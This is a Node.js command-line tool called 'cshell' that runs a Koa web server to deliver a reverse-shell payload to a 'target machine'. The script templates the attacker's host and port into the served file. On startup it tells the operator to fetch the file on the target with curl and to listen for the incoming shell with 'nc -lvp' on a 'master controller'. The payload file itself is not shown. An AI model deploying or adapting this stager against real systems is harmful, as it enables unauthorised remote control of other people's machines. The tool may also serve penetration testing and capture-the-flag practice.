#!/usr/bin/env node

const path = require("path")
const fs = require("fs")
const Koa = require("koa")
const Router = require("koa-router")
const colors = require("colors")
const program = require("commander")
const exit = require("process").exit

const app = new Koa()

const safePath = (filepath) => {
    let fp = path.resolve(".", filepath)
    if (!fs.existsSync(fp)) console.error("File not found: " + fp), exit(1)
    return fp
}

const merge = (partial, full) => {
    for (let key in full) {
        if (typeof partial[key] === "object" && typeof partial[key] === "object")
            merge(partial[key], full[key])
        else if (typeof partial[key] == "undefined")
            partial[key] = full[key]
    }
    return partial
}

// argv

program
    .name("cshell")
    .version(require("./package.json").version, "-v, --version", "output the current version")
    .option("-c, --config <path>", "use custom config")

const USER_CONFIG = merge(
    require(program.opts().config ? safePath(program.opts().config) : "./default.json"),
    require("./default.fallback.json")
)

const DEFAULT = {
    SERVER_HOST: USER_CONFIG["server-host"].trim(),
    SERVER_PORT: USER_CONFIG["server-port"],
    SHELL_HOST: USER_CONFIG["shell-host"].trim(),
    SHELL_PORT: USER_CONFIG["shell-port"],
    STATIC: (USER_CONFIG.static || "").trim(),
    FILE_PATH: (USER_CONFIG.file || "").trim(),
    CONTENT_TYPE: USER_CONFIG["content-type"].trim(),
    DEFAULT_FILE_CONTENT: USER_CONFIG["default-file-content"]
}

program
    .name("cshell")
    .option("-H, --server-host <host>", "set host of the http server to visit", DEFAULT.SERVER_HOST)
    .option("-P, --server-port <port>", "set port of the http server", DEFAULT.SERVER_PORT)
    .option("-h, --shell-host <host>", "set host of the master controller", DEFAULT.SHELL_HOST)
    .option("-p, --shell-port <port>", "set port for shell of the master controller", DEFAULT.SHELL_PORT)
    .option("--host <host>", "alias of --server-host and --shell-host")
    .option("--port <port>", "alias of --server-port and --shell-port")
    .option("-s, --static <path>", "set static directory of the http server", DEFAULT.STATIC || undefined)
    .option("-t, --content-type <type>", "set content type of the attached file", DEFAULT.CONTENT_TYPE)
    .option("--help", "show this help message")
    .arguments("[path]", "the content in the file will be shown on the server", DEFAULT.FILE_PATH)
    .parse(process.argv)

program.addHelpText("after", "\n" + [
    "Copyright (c) 2023 Jevon Wang, MIT License",
    "Source code: https://github.com/Cnily03/cshell"
].join("\n"));

const options = program.opts()
const args = {
    path: program.args[0]
}

// port
if (options.host) options.serverHost = options.shellHost = options.host
if (options.port) options.serverPort = options.shellPort = options.port

for (const key in options)
    if (typeof options[key] !== "undefined") options[key] = options[key].toString()

// file content
function insertArgv(content) {
    return content
        .replace(/\$\{\{ *?env\.server_host *?\}\}/g, options.serverHost)
        .replace(/\$\{\{ *?env\.server_port *?\}\}/g, options.serverPort)
        .replace(/\$\{\{ *?env\.shell_host *?\}\}/g, options.shellHost)
        .replace(/\$\{\{ *?env\.shell_port *?\}\}/g, options.shellPort)
}

options.fileContent = args.path ?
    insertArgv(fs.readFileSync(safePath(args.path))) :
    insertArgv(DEFAULT.DEFAULT_FILE_CONTENT)

// main

if (options.help) program.outputHelp()
else {
    // static dir
    if (options.static && typeof options.static === "string") {
        const staticServer = require("koa-static")
        const staticDir = path.resolve(".", options.static)
        app.use(staticServer(staticDir))
    }

    // routes
    const router_index = new Router()
    // any (log)
    router_index.get(/^\/.*$/, (ctx, next) => {
        if (/\.(html|htm|php|jsp|asp)$/i.test(ctx.url) || !ctx.url.includes("."))
            console.info(
                "[INFO] ".cyan +
                ctx.method.green +
                ` ${ctx.url} `.yellow +
                "FROM ".cyan +
                `${ctx.socket.remoteAddress.replace(/::ffff:/, "")}/${ctx.socket.remotePort}`.yellow
            )
        next()
    })
    // index
    router_index.get("/", (ctx, next) => {
        ctx.type = options.contentType
        ctx.body = options.fileContent
    })

    // apply routes
    app.use(router_index.routes()).use(router_index.allowedMethods())

    // start the server
    app.listen(parseInt(options.serverPort), function () {
        console.info(
            [
                `Server is running at port `.green + `${options.serverPort}`.yellow + `...\n`.green,
                `- ` + `Try `.green +
                `curl -o shell.sh ${options.serverHost}:${options.serverPort}`.cyan.underline +
                ` on the `.green + `target machine`.yellow + `.`.green,
                `- ` + `Try `.green +
                `nc -lvp ${options.shellPort}`.cyan.underline +
                ` on the `.green + `master controller`.yellow + ` (`.green + `${options.shellHost}`.cyan + `).\n`.green,
                `DO NOT forget to quit this process!!!\n`.red
            ].join("\n")
        )
    })
}

module.exports = app